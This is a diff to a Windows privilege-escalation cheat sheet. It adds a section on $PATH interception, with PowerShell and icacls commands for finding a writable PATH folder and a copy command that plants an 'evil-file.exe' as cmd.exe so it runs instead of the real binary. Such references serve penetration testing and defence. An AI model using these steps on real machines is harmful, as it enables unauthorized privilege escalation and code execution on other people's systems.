@@ -52,6 +52,7 @@
   * [MS16-032](#ms16-032---microsoft-windows-7--10--2008--2012-r2-x86x64)
   * [MS17-010 (Eternal Blue)](#ms17-010-eternal-blue)
   * [CVE-2019-1388](#cve-2019-1388)
+* [EoP - $PATH Interception](#eop---path-interception)
 * [References](#references)
 
 ## Tools
@@ -1177,6 +1178,29 @@ Failing on :
 
 Detailed information about the vulnerability : https://www.zerodayinitiative.com/blog/2019/11/19/thanksgiving-treat-easy-as-pie-windows-7-secure-desktop-escalation-of-privilege
 
+
+## EoP - $PATH Interception
+
+Requirements:
+- PATH contains a writeable folder with low privileges.
+- The writeable folder is _before_ the folder that contains the legitimate binary.
+
+EXAMPLE:
+```
+//(Powershell) List contents of the PATH environment variable
+//EXAMPLE OUTPUT: C:\Program Files\nodejs\;C:\WINDOWS\system32
+$env:Path
+
+//See permissions of the target folder
+//EXAMPLE OUTPUT: BUILTIN\Users: GR,GW
+icacls.exe "C:\Program Files\nodejs\"
+
+//Place our evil-file in that folder.
+copy evil-file.exe "C:\Program Files\nodejs\cmd.exe"
+```
+
+Because (in this example) "C:\Program Files\nodejs\" is _before_ "C:\WINDOWS\system32\" on the PATH variable, the next time the user runs "cmd.exe", our evil version in the nodejs folder will run, instead of the legitimate one in the system32 folder. 
+
 ## References
 
 * [Windows Internals Book - 02/07/2017](https://docs.microsoft.com/en-us/sysinternals/learn/windows-internals)
@@ -1211,3 +1235,4 @@ Detailed information about the vulnerability : https://www.zerodayinitiative.com
 * [Abusing Diaghub - xct - March 07, 2019](https://vulndev.io/howto/2019/03/07/diaghub.html)
 * [Windows Exploitation Tricks: Exploiting Arbitrary File Writes for Local Elevation of Privilege - James Forshaw, Project Zero - Wednesday, April 18, 2018](https://googleprojectzero.blogspot.com/2018/04/windows-exploitation-tricks-exploiting.html)
 * [Weaponizing Privileged File Writes with the USO Service - Part 2/2 - itm4n - August 19, 2019](https://itm4n.github.io/usodllloader-part2/)
+* [Hacking Trick: Environment Variable $Path Interception y Escaladas de Privilegios para Windows](https://www.elladodelmal.com/2020/03/hacking-trick-environment-variable-path.html?m=1)
